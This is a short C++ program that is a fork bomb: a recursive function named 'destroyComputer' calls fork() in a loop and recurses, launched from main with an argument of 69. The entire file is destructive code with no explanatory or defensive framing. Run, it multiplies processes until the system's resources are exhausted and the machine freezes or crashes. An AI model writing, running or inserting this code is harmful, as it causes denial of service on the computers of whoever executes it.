#include<iostream>
#include<unistd.h>

using namespace std;

void destroyComputer(int n) {
  for(int i=0; i<n; i++) {
    fork();
    destroyComputer(n-1);
  }
}

int main() {
    destroyComputer(69);
    
    return 0;
}
